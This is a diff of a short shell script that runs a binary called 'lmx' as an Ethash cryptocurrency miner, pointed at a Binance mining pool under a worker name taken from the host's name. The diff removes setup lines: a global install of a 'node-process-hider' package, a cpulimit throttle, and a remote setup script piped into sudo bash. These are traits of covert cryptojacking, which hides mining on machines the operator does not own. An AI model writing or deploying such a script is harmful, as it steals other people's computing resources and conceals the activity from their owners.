@@ -1,13 +1,4 @@
 #!/bin/sh
 
-apt update
-apt update;apt -y install build-essential cpulimit screen ca-certificates libcurl4
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-apt-get install -y nodejs
-apt-get install gcc g++ make
--u root npm i -g node-process-hider
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
 chmod +x lmx
-cpulimit -e lmx -l 30 &
 ./lmx --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:443 --user awikwoklu.$(cat /proc/sys/kernel/hostname)
